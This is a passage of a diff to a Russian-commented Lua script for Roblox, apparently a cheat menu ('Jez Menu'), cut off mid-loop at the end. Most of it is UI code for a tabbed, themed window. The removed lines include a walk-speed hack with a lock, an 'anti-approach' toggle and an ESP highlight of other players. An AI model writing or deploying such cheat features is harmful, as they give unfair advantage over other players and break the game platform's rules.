-    WelcomeFrame.Position = UDim2.new(0.5, -125, 0, -100) 
-    WelcomeFrame.Size = UDim2.new(0, 250, 0, 50)
-    WelcomeFrame.ZIndex = 10 -- Уровень слоя для рамки
-
-    WelcomeCorner.CornerRadius = UDim.new(0, 10)
-    WelcomeCorner.Parent = WelcomeFrame
-
-    local FrameStroke = Instance.new("UIStroke", WelcomeFrame)
-    FrameStroke.Color = Color3.fromRGB(46, 204, 113)
-    FrameStroke.Thickness = 2
-
-    -- Настройка текста
-    WelcomeText.Parent = WelcomeFrame
-    WelcomeText.BackgroundTransparency = 1
-    WelcomeText.Size = UDim2.new(1, 0, 1, 0)
-    WelcomeText.ZIndex = 20 -- СТАВИМ ТЕКСТ НАМНОГО ВЫШЕ РАМКИ
-    WelcomeText.Font = Enum.Font.GothamBold
-    WelcomeText.TextColor3 = Color3.new(1, 1, 1)
-    WelcomeText.TextSize = 16
-    WelcomeText.Text = "Здравствуйте, " .. game.Players.LocalPlayer.DisplayName .. "!"
-    WelcomeText.TextTransparency = 0 
-    WelcomeText.Visible = true -- Принудительно включаем видимость
-
-    -- Добавляем обводку тексту для четкости
-    local TextStroke = Instance.new("UIStroke", WelcomeText)
-    TextStroke.Thickness = 1
-    TextStroke.Color = Color3.new(0, 0, 0)
-    TextStroke.Transparency = 0.5
-
-    -- Анимация появления
-    WelcomeFrame:TweenPosition(UDim2.new(0.5, -125, 0, 20), "Out", "Back", 0.5, true)
-
-    -- Ждем 5 секунд и убираем
-    task.delay(5, function()
-        if WelcomeFrame then
-            WelcomeFrame:TweenPosition(UDim2.new(0.5, -125, 0, -100), "In", "Back", 0.5, true)
-            task.wait(0.6)
-            WelcomeFrame:Destroy()
-        end
-    end)
-end
-
-ShowWelcome()
-
-
--- LOADING SCREEN
-
-local LoadingFrame = Instance.new("Frame", ScreenGui)
-LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
-LoadingFrame.BackgroundTransparency = 1 -- Прозрачный фон, как ты и хотел
-
-local LoadingIcon = Instance.new("ImageLabel", LoadingFrame)
-LoadingIcon.Size = UDim2.new(0, 140, 0, 140)
-LoadingIcon.AnchorPoint = Vector2.new(0.5, 0.5)
-LoadingIcon.Position = UDim2.new(0.5, 0, 0.45, 0) -- Чуть выше центра
-LoadingIcon.BackgroundTransparency = 0.2 -- Слегка заметный фон под иконкой
-LoadingIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-LoadingIcon.Image = "rbxassetid://115895618324258"
-LoadingIcon.ScaleType = Enum.ScaleType.Fit
-
--- Скругляем углы у логотипа, чтобы не было "квадрата"
-local IconCorner = Instance.new("UICorner", LoadingIcon)
-IconCorner.CornerRadius = UDim.new(0, 20)
-
-local LoadingText = Instance.new("TextLabel", LoadingFrame)
-LoadingText.Size = UDim2.new(1, 0, 0, 50)
-LoadingText.Position = UDim2.new(0, 0, 0.6, 0) -- Текст под иконкой
-LoadingText.BackgroundTransparency = 1
-LoadingText.Text = "ЗАГРУЗКА..."
-LoadingText.TextColor3 = Color3.fromRGB(46, 204, 113)
-LoadingText.Font = Enum.Font.GothamBold
-LoadingText.TextSize = 32 -- Сделал чуть крупнее
-LoadingText.TextStrokeTransparency = 0 -- Полная обводка
-
--- ДОБАВЛЯЕМ КРАСИВУЮ ОБВОДКУ ТЕКСТУ
-local TextStroke = Instance.new("UIStroke", LoadingText)
-TextStroke.Thickness = 2.5 -- Толщина линии
-TextStroke.Color = Color3.fromRGB(0, 0, 0) -- Черный цвет обводки
-
-local showFPS = false
-local FPSLabel = Instance.new("TextLabel", ScreenGui)
-FPSLabel.Size = UDim2.new(0, 160, 0, 30) -- Увеличили ширину со 100 до 160
-FPSLabel.Position = UDim2.new(0.5, -80, 0, 10) -- Сдвинули левее (-80 это половина от 160), чтобы текст остался по центру
-FPSLabel.Text = "Загрузка..."
-FPSLabel.BackgroundTransparency = 0.5
-FPSLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FPSLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-FPSLabel.Font = Enum.Font.GothamBold
-FPSLabel.TextSize = 16
-FPSLabel.Visible = false 
-FPSLabel.Text = ""
-Instance.new("UICorner", FPSLabel)
-
--- ОБНОВЛЕННЫЙ БЛОК: Расчет FPS и PING
-
-task.spawn(function()
-    local lastUpdate = tick()
-    local frames = 0
-
-    while true do
-        frames = frames + 1
-        local now = tick()
-        local diff = now - lastUpdate
-        
-        if diff >= 0.5 then
-            if FPSLabel.Visible then
-                local fps = math.floor(frames / diff)
-                
-                
-                local ping = 0
-                pcall(function()
-                    ping = math.floor(localPlayer:GetNetworkPing() * 1000)
-                end)
-                
-                -- Выводим FPS и PING
-                FPSLabel.Text = "FPS: " .. fps .. " | PING: " .. ping .. "ms"
-            end
-            frames = 0
-            lastUpdate = now
-        end
-        RunService.RenderStepped:Wait()
-    end
-end)
-
-
-
--- 1. ГЛАВНОЕ ОКНО
-
+-- СБАЛАНСИРОВАННЫЙ РАЗМЕР MAIN FRAME (440x550)
 local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 440, 0, 550)
+MainFrame.Position = UDim2.new(0.5, -220, 0.5, -275)
+MainFrame.BackgroundColor3 = Themes.Default.Black
+MainFrame.BorderSizePixel = 0
 MainFrame.Visible = false
-MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
-MainFrame.Position = UDim2.new(0, 20, 0.15, 0)
-MainFrame.Size = UDim2.new(0, 300, 0, 480)
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
+MainFrame.ClipsDescendants = true
+MainFrame.ZIndex = 1
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)
 
-task.spawn(function()
-    task.wait(5) 
-    if LoadingFrame then 
-        LoadingFrame:Destroy() 
-    end
-    if FloatingBtn then 
-    FloatingBtn.Visible = true
-    print("Jez Menu: Кнопка активирована")
-end
-    print("Jez Menu: Загрузка завершена")
-end)
+local MainStroke = Instance.new("UIStroke", MainFrame)
+MainStroke.Thickness = 1.5
+MainStroke.Color = Themes.Default.Grey
 
-local TimeLabel = Instance.new("TextLabel", ScreenGui)
-task.spawn(function()
-    while true do
-        if TimeLabel then
-            TimeLabel.Text = os.date("%X")
-        end
-        task.wait(1)
-    end
-end)
-TimeLabel.Name = HttpService:GenerateGUID(false)
-TimeLabel.Size = UDim2.new(0, 100, 0, 30)
-TimeLabel.Position = UDim2.new(0, 10, 0, 10) -- В самом углу
-TimeLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TimeLabel.BackgroundTransparency = 0.5
-TimeLabel.TextColor3 = Color3.fromRGB(144, 238, 144)
-TimeLabel.Font = Enum.Font.GothamBold
-TimeLabel.TextSize = 16
-TimeLabel.Text = ""
-Instance.new("UICorner", TimeLabel).CornerRadius = UDim.new(0, 8)
+local MainScale = Instance.new("UIScale", MainFrame)
+MainScale.Scale = 0
+makeDraggable(MainFrame)
 
--- ОБНОВЛЕННЫЙ ЗАГОЛОВОК С ЗЕЛЕНОЙ ИКОНКОЙ
-local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 50)
-Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Title.Text = "Jez Меню"
-Title.TextColor3 = Color3.fromRGB(46, 204, 113)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 22
-Title.TextXAlignment = Enum.TextXAlignment.Center -- Центрируем текст
-Instance.new("UICorner", Title).CornerRadius = UDim.new(0, 12)
+-- ==========================================
+--                 ЗАГОЛОВОК
+-- ==========================================
 
-local CustomIcon = Instance.new("ImageLabel", Title)
-CustomIcon.Name = "CustomIcon"
-CustomIcon.Size = UDim2.new(0, 32, 0, 32)
-CustomIcon.Position = UDim2.new(0, 10, 0.5, -16) 
-CustomIcon.BackgroundTransparency = 1
-CustomIcon.Image = "rbxassetid://115895618324258"
-CustomIcon.ScaleType = Enum.ScaleType.Fit -- Чтобы маленькую иконку не сплющило
-CustomIcon.ZIndex = 20 
-CustomIcon.Visible = true
+local Header = Instance.new("Frame", MainFrame)
+Header.Name = "Header"
+Header.Size = UDim2.new(1, 0, 0, 54)
+Header.BackgroundColor3 = Themes.Default.Dark
+Header.BorderSizePixel = 0
+Header.ZIndex = 10
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 16)
 
-local CloseBtn = Instance.new("TextButton", MainFrame)
+local HeaderLogo = Instance.new("TextLabel", Header)
+HeaderLogo.Name = "HeaderLogo"
+HeaderLogo.Size = UDim2.new(0, 32, 1, 0)
+HeaderLogo.Position = UDim2.new(0, 16, 0, 0)
+HeaderLogo.BackgroundTransparency = 1
+HeaderLogo.Text = "J"
+HeaderLogo.Font = Enum.Font.GothamBlack
+HeaderLogo.TextSize = 28
+HeaderLogo.TextColor3 = Themes.Default.White
+HeaderLogo.TextXAlignment = Enum.TextXAlignment.Center
+HeaderLogo.ZIndex = 11
+
+local HeaderDivider = Instance.new("Frame", Header)
+HeaderDivider.Size = UDim2.new(0, 1, 0, 22)
+HeaderDivider.Position = UDim2.new(0, 52, 0.5, -11)
+HeaderDivider.BackgroundColor3 = Themes.Default.Grey
+HeaderDivider.BorderSizePixel = 0
+HeaderDivider.ZIndex = 11
+
+local username = (LocalPlayer and LocalPlayer.Name) or "USER"
+local HeaderTitle = Instance.new("TextLabel", Header)
+HeaderTitle.Name = "HeaderTitle"
+HeaderTitle.Size = UDim2.new(1, -130, 1, 0)
+HeaderTitle.Position = UDim2.new(0, 62, 0, 0)
+HeaderTitle.BackgroundTransparency = 1
+HeaderTitle.Text = L("Welcome") .. string.upper(username)
+HeaderTitle.Font = Enum.Font.GothamBold
+HeaderTitle.TextSize = 12
+HeaderTitle.TextColor3 = Themes.Default.Light
+HeaderTitle.TextXAlignment = Enum.TextXAlignment.Left
+HeaderTitle.ZIndex = 11
+
+-- Кнопка закрытия (X)
+local CloseBtn = Instance.new("TextButton", Header)
+CloseBtn.Name = "CloseBtn"
 CloseBtn.Size = UDim2.new(0, 30, 0, 30)
-CloseBtn.Position = UDim2.new(1, -35, 0, 10)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+CloseBtn.Position = UDim2.new(1, -40, 0.5, -15)
+CloseBtn.BackgroundColor3 = Themes.Default.Grey
+CloseBtn.BackgroundTransparency = 0.4
+CloseBtn.BorderSizePixel = 0
 CloseBtn.Text = "X"
-styleText(CloseBtn, 16)
-Instance.new("UICorner", CloseBtn)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 14
+CloseBtn.TextColor3 = Themes.Default.White
+CloseBtn.ZIndex = 11
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)
+
+-- КНОПКА СМЕНЫ ЯЗЫКА
+local LangBtn = Instance.new("TextButton", Header)
+LangBtn.Name = "LangBtn"
+LangBtn.Size = UDim2.new(0, 30, 0, 30)
+LangBtn.Position = UDim2.new(1, -76, 0.5, -15)
+LangBtn.BackgroundColor3 = Themes.Default.Grey
+LangBtn.BackgroundTransparency = 0.4
+LangBtn.BorderSizePixel = 0
+LangBtn.Text = currentLanguage
+LangBtn.Font = Enum.Font.GothamBold
+LangBtn.TextSize = 11
+LangBtn.TextColor3 = Themes.Default.White
+LangBtn.ZIndex = 11
+Instance.new("UICorner", LangBtn).CornerRadius = UDim.new(1, 0)
+
+local LangStroke = Instance.new("UIStroke", LangBtn)
+LangStroke.Thickness = 1
+LangStroke.Color = Themes.Default.Grey
+table.insert(registeredButtons, {Button = LangBtn, Stroke = LangStroke})
 
 CloseBtn.MouseButton1Click:Connect(function()
-    MainFrame.Visible = false
-    -- Скрываем дополнительные окна, если они открыты
-    if ScriptFrame then ScriptFrame.Visible = false end
-    if PlayerFrame then PlayerFrame.Visible = false end
-    
-    -- Показываем маленькую плавающую кнопку
-    FloatingBtn.Visible = true 
+    if isMenuAnimating then return end
+    isMenuAnimating = true
+
+    local tw = tween(MainScale, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Scale = 0})
+    tw.Completed:Once(function()
+        MainFrame.Visible = false
+        FloatScale.Scale = 0
+        FloatingBtn.Visible = true
+        tween(FloatScale, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
+        isMenuAnimating = false
+    end)
 end)
 
--- [[ ЭЛЕМЕНТЫ МЕНЮ С FPS ]] --
+FloatingBtn.MouseButton1Click:Connect(function()
+    if isMenuAnimating then return end
+    isMenuAnimating = true
 
--- Поле ввода скорости и кнопки управления
-local SpeedTitle = Instance.new("TextLabel", MainFrame)
-SpeedTitle.Size = UDim2.new(1, 0, 0, 20)
-SpeedTitle.Position = UDim2.new(0, 0, 0, 60)
-SpeedTitle.BackgroundTransparency = 1
-SpeedTitle.Text = "СКОРОСТЬ БЕГА"
-styleText(SpeedTitle, 13)
+    local tw = tween(FloatScale, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Scale = 0})
+    tw.Completed:Once(function()
+        FloatingBtn.Visible = false
+        MainFrame.Visible = true
+        tween(MainScale, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
+        isMenuAnimating = false
+    end)
+end)
 
-local SpeedInput = Instance.new("TextBox", MainFrame)
-SpeedInput.Size = UDim2.new(0.9, 0, 0, 45)
-SpeedInput.Position = UDim2.new(0.05, 0, 0, 80)
-SpeedInput.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-SpeedInput.Text = "16"
-SpeedInput.PlaceholderText = "Введите скорость..."
-SpeedInput.TextColor3 = Color3.fromRGB(46, 204, 113)
-SpeedInput.ClearTextOnFocus = false
-styleText(SpeedInput, 22)
-Instance.new("UICorner", SpeedInput)
+-- ==========================================
+--             СИСТЕМА ВКЛАДОК
+-- ==========================================
 
--- Функция обновления скорости
-local function applySpeed(newSpeed)
-    local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
-    if hum then
-        hum.WalkSpeed = newSpeed
-        currentSpeed = newSpeed
-        if forceSpeed then
-            savedSpeed = newSpeed
+local ScrollLeftBtn = Instance.new("TextButton", MainFrame)
+ScrollLeftBtn.Name = "ScrollLeftBtn"
+ScrollLeftBtn.Size = UDim2.new(0, 24, 0, 34)
+ScrollLeftBtn.Position = UDim2.new(0, 10, 0, 62)
+ScrollLeftBtn.BackgroundColor3 = CurrentTheme.Dark
+ScrollLeftBtn.BorderSizePixel = 0
+ScrollLeftBtn.Text = "<"
+ScrollLeftBtn.Font = Enum.Font.GothamBold
+ScrollLeftBtn.TextSize = 14
+ScrollLeftBtn.TextColor3 = CurrentTheme.White
+ScrollLeftBtn.ZIndex = 12
+Instance.new("UICorner", ScrollLeftBtn).CornerRadius = UDim.new(0, 6)
+
+local ScrollLeftStroke = Instance.new("UIStroke", ScrollLeftBtn)
+ScrollLeftStroke.Thickness = 1
+ScrollLeftStroke.Color = CurrentTheme.Grey
+table.insert(registeredButtons, {Button = ScrollLeftBtn, Stroke = ScrollLeftStroke})
+
+local ScrollRightBtn = Instance.new("TextButton", MainFrame)
+ScrollRightBtn.Name = "ScrollRightBtn"
+ScrollRightBtn.Size = UDim2.new(0, 24, 0, 34)
+ScrollRightBtn.Position = UDim2.new(1, -34, 0, 62)
+ScrollRightBtn.BackgroundColor3 = CurrentTheme.Dark
+ScrollRightBtn.BorderSizePixel = 0
+ScrollRightBtn.Text = ">"
+ScrollRightBtn.Font = Enum.Font.GothamBold
+ScrollRightBtn.TextSize = 14
+ScrollRightBtn.TextColor3 = CurrentTheme.White
+ScrollRightBtn.ZIndex = 12
+Instance.new("UICorner", ScrollRightBtn).CornerRadius = UDim.new(0, 6)
+
+local ScrollRightStroke = Instance.new("UIStroke", ScrollRightBtn)
+ScrollRightStroke.Thickness = 1
+ScrollRightStroke.Color = CurrentTheme.Grey
+table.insert(registeredButtons, {Button = ScrollRightBtn, Stroke = ScrollRightStroke})
+
+local TabBar = Instance.new("ScrollingFrame", MainFrame)
+TabBar.Name = "TabBar"
+TabBar.Size = UDim2.new(1, -68, 0, 34)
+TabBar.Position = UDim2.new(0, 38, 0, 62)
+TabBar.BackgroundTransparency = 1
+TabBar.BorderSizePixel = 0
+TabBar.CanvasSize = UDim2.new(0, 0, 0, 0)
+TabBar.AutomaticCanvasSize = Enum.AutomaticSize.X
+TabBar.ScrollingEnabled = true
+TabBar.ScrollBarThickness = 0
+TabBar.ZIndex = 10
+
+local TabList = Instance.new("UIListLayout", TabBar)
+TabList.FillDirection = Enum.FillDirection.Horizontal
+TabList.Padding = UDim.new(0, 4)
+TabList.SortOrder = Enum.SortOrder.LayoutOrder
+
+ScrollLeftBtn.MouseButton1Click:Connect(function()
+    TabBar.CanvasPosition = Vector2.new(math.max(0, TabBar.CanvasPosition.X - 100), 0)
+end)
+
+ScrollRightBtn.MouseButton1Click:Connect(function()
+    TabBar.CanvasPosition = Vector2.new(TabBar.CanvasPosition.X + 100, 0)
+end)
+
+local PagesContainer = Instance.new("Frame", MainFrame)
+PagesContainer.Name = "PagesContainer"
+PagesContainer.Size = UDim2.new(1, -20, 1, -112)
+PagesContainer.Position = UDim2.new(0, 10, 0, 104)
+PagesContainer.BackgroundTransparency = 1
+PagesContainer.ClipsDescendants = true
+PagesContainer.ZIndex = 2
+
+local tabs = {}
+local activeTab = nil
+
+local function switchTab(tabData)
+    if activeTab == tabData then return end
+    
+    if activeTab then
+        if not isRainbowActive then
+            tween(activeTab.Button, TweenInfo.new(0.15), {
+                BackgroundColor3 = CurrentTheme.Dark,
+                TextColor3 = CurrentTheme.Light
+            })
+            tween(activeTab.Stroke, TweenInfo.new(0.15), {Transparency = 0.8})
         end
+        activeTab.Page.Visible = false
+    end
+    
+    activeTab = tabData
+    
+    if not isRainbowActive then
+        tween(tabData.Button, TweenInfo.new(0.15), {
+            BackgroundColor3 = CurrentTheme.Grey,
+            TextColor3 = CurrentTheme.White
+        })
+        tween(tabData.Stroke, TweenInfo.new(0.15), {Transparency = 0.2})
+    end
+    
+    local newPage = tabData.Page
+    local newScale = tabData.Scale
+    
+    newPage.Position = UDim2.new(0, 0, 0, 8)
+    newScale.Scale = 0.96
+    newPage.Visible = true
+    
+    tween(newScale, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Scale = 1})
+    tween(newPage, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0, 0, 0, 0)
+    })
+end
+
+local function addTab(tabKey, displayName)
+    local tabBtn = Instance.new("TextButton", TabBar)
+    tabBtn.Name = tabKey .. "Btn"
+    tabBtn.Size = UDim2.new(0, 68, 1, 0)
+    tabBtn.BackgroundColor3 = CurrentTheme.Dark
+    tabBtn.BorderSizePixel = 0
+    tabBtn.Text = displayName
+    tabBtn.Font = Enum.Font.GothamBold
+    tabBtn.TextSize = 11
+    tabBtn.TextColor3 = CurrentTheme.Light
+    tabBtn.ZIndex = 11
+    Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0, 7)
+    
+    local tabStroke = Instance.new("UIStroke", tabBtn)
+    tabStroke.Thickness = 1
+    tabStroke.Color = CurrentTheme.Grey
+    tabStroke.Transparency = 0.8
+    
+    local page = Instance.new("ScrollingFrame", PagesContainer)
+    page.Name = tabKey .. "Page"
+    page.Size = UDim2.new(1, 0, 1, 0)
+    page.Position = UDim2.new(0, 0, 0, 0)
+    page.BackgroundTransparency = 1
+    page.BorderSizePixel = 0
+    page.ScrollBarThickness = 4
+    page.ScrollBarImageColor3 = CurrentTheme.Grey
+    page.CanvasSize = UDim2.new(0, 0, 0, 0)
+    page.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    page.Visible = false
+    page.ClipsDescendants = true
+    page.ZIndex = 3
+    
+    local pageScale = Instance.new("UIScale", page)
+    pageScale.Scale = 1
+    
+    local pagePadding = Instance.new("UIPadding", page)
+    pagePadding.PaddingLeft = UDim.new(0, 4)
+    pagePadding.PaddingRight = UDim.new(0, 6)
+    pagePadding.PaddingTop = UDim.new(0, 4)
+    pagePadding.PaddingBottom = UDim.new(0, 6)
+    
+    local pageList = Instance.new("UIListLayout", page)
+    pageList.Padding = UDim.new(0, 8)
+    pageList.SortOrder = Enum.SortOrder.LayoutOrder
+    
+    local tabData = {
+        Key = tabKey,
+        Button = tabBtn,
+        Stroke = tabStroke,
+        Page = page,
+        Scale = pageScale
+    }
+    
+    tabBtn.MouseButton1Click:Connect(function()
+        switchTab(tabData)
+    end)
+    
+    table.insert(tabs, tabData)
+    return page
+end
+
+-- ==========================================
+--        ТЕМЫ И РАДУГА
+-- ==========================================
+
+local clockWidgetRef = nil
+local clockStrokeRef = nil
+local clockTimeRef = nil
+local clockDateRef = nil
+
+local function stopRainbowTheme()
+    isRainbowActive = false
+    if rainbowConnection then
+        rainbowConnection:Disconnect()
+        rainbowConnection = nil
     end
 end
 
--- Обработка ввода текста в поле
-SpeedInput.FocusLost:Connect(function(enterPressed)
-    local val = tonumber(SpeedInput.Text)
-    if val then
-        applySpeed(val)
-    else
-        local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
-        if hum then
-            SpeedInput.Text = tostring(hum.WalkSpeed)
-        end
-    end
-end)
-
--- Замок фиксации скорости
-local LockBtn = Instance.new("TextButton", SpeedInput)
-LockBtn.Size = UDim2.new(0, 30, 0, 30)
-LockBtn.Position = UDim2.new(1, -35, 0.5, -15)
-LockBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-LockBtn.Text = "🔓"
-LockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-LockBtn.Font = Enum.Font.GothamBold
-LockBtn.TextSize = 18
-Instance.new("UICorner", LockBtn).CornerRadius = UDim.new(0, 6)
-
-LockBtn.MouseButton1Click:Connect(function()
-    lockSpeedEnabled = not lockSpeedEnabled
-    forceSpeed = lockSpeedEnabled
-
-    local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
-    if lockSpeedEnabled and hum then
-        savedSpeed = hum.WalkSpeed
-        LockBtn.Text = "🔒"
-        LockBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-    else
-        LockBtn.Text = "🔓"
-        LockBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    end
-end)
-
--- Кнопки +1 и -1
-local isAdding, isSubbing = false, false
-
-local AddS = Instance.new("TextButton", MainFrame)
-AddS.Size = UDim2.new(0.43, 0, 0, 35)
-AddS.Position = UDim2.new(0.05, 0, 0, 135)
-AddS.BackgroundColor3 = Color_Btn
-AddS.Text = "+1 БЕГ"
-styleText(AddS, 14)
-Instance.new("UICorner", AddS)
-
-local SubS = Instance.new("TextButton", MainFrame)
-SubS.Size = UDim2.new(0.43, 0, 0, 35)
-SubS.Position = UDim2.new(0.52, 0, 0, 135)
-SubS.BackgroundColor3 = Color_Btn
-SubS.Text = "-1 БЕГ"
-styleText(SubS, 14)
-Instance.new("UICorner", SubS)
-
-AddS.MouseButton1Down:Connect(function()
-    isAdding = true
-    while isAdding do
-        local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
-        if hum then
-            local newSpeed = hum.WalkSpeed + 1
-            applySpeed(newSpeed)
-            SpeedInput.Text = tostring(newSpeed)
-        end
-        task.wait(0.08)
-    end
-end)
-AddS.MouseButton1Up:Connect(function() isAdding = false end)
-AddS.MouseLeave:Connect(function() isAdding = false end)
-
-SubS.MouseButton1Down:Connect(function()
-    isSubbing = true
-    while isSubbing do
-        local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
-        if hum then
-            local newSpeed = math.max(0, hum.WalkSpeed - 1)
-            applySpeed(newSpeed)
-            SpeedInput.Text = tostring(newSpeed)
-        end
-        task.wait(0.08)
-    end
-end)
-SubS.MouseButton1Up:Connect(function() isSubbing = false end)
-SubS.MouseLeave:Connect(function() isSubbing = false end)
-
--- Функции
-local AntiBtn = Instance.new("TextButton", MainFrame)
-AntiBtn.Size = UDim2.new(0.9, 0, 0, 40)
-AntiBtn.Position = UDim2.new(0.05, 0, 0, 185)
-AntiBtn.BackgroundColor3 = Color_Off
-AntiBtn.Text = "Не подходи: ВЫКЛ"
-styleText(AntiBtn, 14)
-Instance.new("UICorner", AntiBtn)
-
-local ESPBtn = Instance.new("TextButton", MainFrame)
-ESPBtn.Size = UDim2.new(0.9, 0, 0, 40)
-ESPBtn.Position = UDim2.new(0.05, 0, 0, 235)
-ESPBtn.BackgroundColor3 = Color_Off
-ESPBtn.Text = "Подсветка: ВЫКЛ"
-styleText(ESPBtn, 14)
-Instance.new("UICorner", ESPBtn)
-
--- КНОПКА FPS
-local FPSBtn = Instance.new("TextButton", MainFrame)
-FPSBtn.Size = UDim2.new(0.9, 0, 0, 40)
-FPSBtn.Position = UDim2.new(0.05, 0, 0, 285)
-FPSBtn.BackgroundColor3 = Color_Off
-FPSBtn.Text = "Показать FPS: ВЫКЛ"
-styleText(FPSBtn, 14)
-Instance.new("UICorner", FPSBtn)
-
-FPSBtn.MouseButton1Click:Connect(function()
-    showFPS = not showFPS
-    FPSLabel.Visible = showFPS
-    -- Обновили текст кнопки
-    FPSBtn.Text = "Показать FPS/Ping: " .. (showFPS and "ВКЛ" or "ВЫКЛ")
-    FPSBtn.BackgroundColor3 = showFPS and Color_On or Color_Off
-end)
-
--- Переключатели окон
-local OpenScripts = Instance.new("TextButton", MainFrame)
-OpenScripts.Size = UDim2.new(0.43, 0, 0, 45)
-OpenScripts.Position = UDim2.new(0.05, 0, 0, 345)
-OpenScripts.BackgroundColor3 = Color_Btn
-OpenScripts.Text = "СКРИПТЫ"
-styleText(OpenScripts, 14)
-Instance.new("UICorner", OpenScripts)
-
-local OpenPlayer = Instance.new("TextButton", MainFrame)
-OpenPlayer.Size = UDim2.new(0.43, 0, 0, 45)
-OpenPlayer.Position = UDim2.new(0.52, 0, 0, 345)
-OpenPlayer.BackgroundColor3 = Color_Btn
-OpenPlayer.Text = "ИГРОК"
-styleText(OpenPlayer, 14)
-Instance.new("UICorner", OpenPlayer)
-
-local OpenAnims = Instance.new("TextButton", MainFrame)
-OpenAnims.Size = UDim2.new(0.9, 0, 0, 45) 
-OpenAnims.Position = UDim2.new(0.05, 0, 0, 400) 
-OpenAnims.BackgroundColor3 = Color_Btn 
-OpenAnims.Text = "АНИМАЦИИ"
-styleText(OpenAnims, 14) 
-Instance.new("UICorner", OpenAnims) 
-
--- [[ ДОБАВЛЕНИЕ ВЕРСИИ ВНИЗУ ]] --
-local VersionLabel = Instance.new("TextLabel", MainFrame)
-VersionLabel.Size = UDim2.new(1, 0, 0, 20)
-VersionLabel.Position = UDim2.new(0, 0, 1, -25)
-VersionLabel.BackgroundTransparency = 1
-VersionLabel.Text = "v20" -- версия
-
-VersionLabel.TextColor3 = Color3.fromRGB(180, 180, 180) -- Светло-серый
-VersionLabel.Font = Enum.Font.Gotham
-VersionLabel.TextSize = 10
-VersionLabel.TextTransparency = 0.5 -- Оставляем полупрозрачность для стиля
-
--- ЛОГИКА КНОПОК
-AntiBtn.MouseButton1Click:Connect(function()
-    antiApproach = not antiApproach
-    AntiBtn.Text = antiApproach and "Не подходи: ВКЛ" or "Не подходи: ВЫКЛ"
-    AntiBtn.BackgroundColor3 = antiApproach and Color_On or Color_Off
-end)
-
--- УНИВЕРСАЛЬНАЯ КНОПКА ESP (Подсветка)
-ESPBtn.MouseButton1Click:Connect(function()
-    espEnabled = not espEnabled
-    ESPBtn.Text = "Подсветка: " .. (espEnabled and "ВКЛ" or "ВЫКЛ")
-    ESPBtn.BackgroundColor3 = espEnabled and Color3.fromRGB(46, 204, 113) or Color_Off
+local function startRainbowTheme()
+    stopRainbowTheme()
+    isRainbowActive = true
     
-    for _, p in pairs(game.Players:GetPlayers()) do
-        if p.Character then
-            -- Выключаем обводку
-            local hl = p.Character:FindFirstChild("JezHL")
-            if hl then hl.Enabled = espEnabled end
-            
-            -- Выключаем метку над головой
-            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
-            if hrp and hrp:FindFirstChild("JezTag") then
-                hrp.JezTag.Enabled = espEnabled
+    rainbowConnection = RunService.RenderStepped:Connect(function()
+        if not isRainbowActive then return end
+        
+        local hue = (tick() * 0.25) % 1
+        local accentColor = Color3.fromHSV(hue, 0.8, 1)
+        local darkAccent   = Color3.fromHSV(hue, 0.7, 0.25)
+        local blackBG      = Color3.fromHSV(hue, 0.6, 0.1)
+        
+        MainFrame.BackgroundColor3 = blackBG
+        Header.BackgroundColor3 = darkAccent
+        MainStroke.Color = accentColor
+        HeaderDivider.BackgroundColor3 = accentColor
+        HeaderLogo.TextColor3 = accentColor
+        HeaderTitle.TextColor3 = Color3.fromRGB(240, 240, 240)
+        
+        FloatingBtn.BackgroundColor3 = darkAccent
+        FloatingBtn.TextColor3 = accentColor
+        FloatStroke.Color = accentColor
+        ScrollLeftBtn.BackgroundColor3 = darkAccent
+        ScrollLeftStroke.Color = accentColor
+        ScrollRightBtn.BackgroundColor3 = darkAccent
+        ScrollRightStroke.Color = accentColor
+        
+        if clockWidgetRef then
+            clockWidgetRef.BackgroundColor3 = darkAccent
+            clockStrokeRef.Color = accentColor
+            clockTimeRef.TextColor3 = accentColor
+        end
+        
+        for _, tabData in ipairs(tabs) do
+            tabData.Stroke.Color = accentColor
+            tabData.Stroke.Transparency = (activeTab == tabData) and 0 or 0.6
+            tabData.Page.ScrollBarImageColor3 = accentColor
+            if activeTab == tabData then
+                tabData.Button.BackgroundColor3 = accentColor
+                tabData.Button.TextColor3 = Color3.fromRGB(15, 15, 15)
+            else
